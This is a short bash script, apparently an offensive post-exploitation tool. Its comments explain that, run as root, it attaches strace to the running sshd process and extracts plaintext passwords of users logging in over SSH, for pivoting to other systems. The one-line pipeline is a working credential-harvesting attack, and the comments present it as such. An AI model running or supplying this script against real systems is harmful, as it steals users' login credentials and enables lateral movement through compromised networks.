#!/bin/bash
#
# In a facepalm revelation, it has come to my attention that you can use strace as root to collect passwords from sshd
# Passwords are useful for pivoting and can be significantly faster than cracking /etc/shadow
# I've noticed some passwords seem to have an 'r' inserted before them. No idea why...
#

strace -s 64 -fp `cat /var/run/sshd.pid` 2>&1 | grep --line-buffered -Eo 'write\(4, "\\0\\0\\0\\[0-9]*[^\]{2,}[^\\0]"' | sed -e 's/write(4, "\\0\\0\\0\\[0-9]*\(.*\)"/\1/g'
